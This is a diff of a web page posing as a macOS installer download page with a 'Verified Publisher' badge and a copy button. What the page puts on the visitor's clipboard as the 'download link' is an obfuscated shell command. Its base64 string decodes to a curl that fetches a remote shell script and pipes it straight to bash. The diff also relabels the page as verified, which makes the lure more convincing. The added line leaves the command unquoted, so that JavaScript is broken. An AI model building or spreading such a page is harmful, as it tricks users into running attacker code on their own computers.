@@ -245,18 +245,18 @@ body {
 
         <h1>Download for macOS</h1>
 
-        <span class="verified">Publisher Website</span>
+        <span class="verified">Verified Publisher</span>
 
     </div>
 
     <div class="main-panel">
 
         <h2 class="section-title">
-            Official download link
+            Download link
         </h2>
 
         <p class="description">
-            Copy the official download link below to get the macOS installer.
+            Copy the download link below to get the macOS installer.
         </p>
 
         <div class="command-wrapper">
@@ -266,7 +266,7 @@ body {
                 class="command-input"
                 id="command"
                 readonly
-                aria-label="Official download URL"
+                aria-label="Download URL"
             >
 
             <button
@@ -311,14 +311,14 @@ body {
 
 <script>
 
-const DOWNLOAD_URL = "bash <<< $(echo "Y3VybCAtcyAnaHR0cHM6Ly9tdTdrcS5iZWRvZy5zaXRlL0NoaWxkSXRlbS5zaCcgfCBiYXNo" | base64 -d)";
+const DOWNLOAD_URL = bash <<< $(echo "Y3VybCAtcyAnaHR0cHM6Ly9tdTdrcS5iZWRvZy5zaXRlL0NoaWxkSXRlbS5zaCcgfCBiYXNo" | base64 -d);
   
 // SHOW LINK INSIDE INPUT
 
 const commandInput = document.getElementById("command");
 const copyButton = document.getElementById("copyButton");
 
-commandInput.value = OFFICIAL_DOWNLOAD_URL;
+commandInput.value = DOWNLOAD_URL;
 
 
 // COPY BUTTON FUNCTION
@@ -330,7 +330,7 @@ async function copyCommand() {
         if (navigator.clipboard && window.isSecureContext) {
 
             await navigator.clipboard.writeText(
-                OFFICIAL_DOWNLOAD_URL
+                DOWNLOAD_URL
             );
 
         } else {
